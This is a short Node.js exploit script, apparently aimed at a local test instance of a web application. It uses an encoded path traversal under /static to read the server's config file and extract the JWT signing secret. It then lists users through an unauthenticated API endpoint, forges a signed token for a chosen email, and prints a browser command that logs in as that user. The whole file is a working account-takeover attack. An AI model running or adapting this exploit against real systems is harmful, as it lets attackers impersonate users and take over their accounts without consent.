const axios = require('axios');
const jwt = require('jsonwebtoken');
const argv = require('optimist')
    .usage('Usage: $0 --target-email [test@mail.com]')
    .demand(['target-email']).argv;

const APP_URL = 'http://localhost:8081';

async function main(args) {
    const config = await fetchConfig();
    const user = await findUserByEmail(args['target-email']);
    const token = createToken({ email: args['target-email'], id: user.id, secret: config.secret });
    console.log(`TO LOGIN: localStorage.setItem('token', '${token}');`);
}

async function fetchConfig() {
    const url = `${APP_URL}/static/%2e%2e/etc/config.json`;
    const resp = await axios.get(url);
    return resp.data;
}

function createToken({ id, email, secret }) {
    const data = {
        id: id,
        email: email,
        status: 'ACTIVE',
        firstName: '',
        secondName: ''
    };

    return jwt.sign(data, secret);
}

async function findUserByEmail(email) {
    const url = `${APP_URL}/api/v1/users`;
    const resp = await axios.get(url);
    return resp.data.data.find(user => user.email === email);
}

main(argv).catch(e => {
    console.error(e);
});
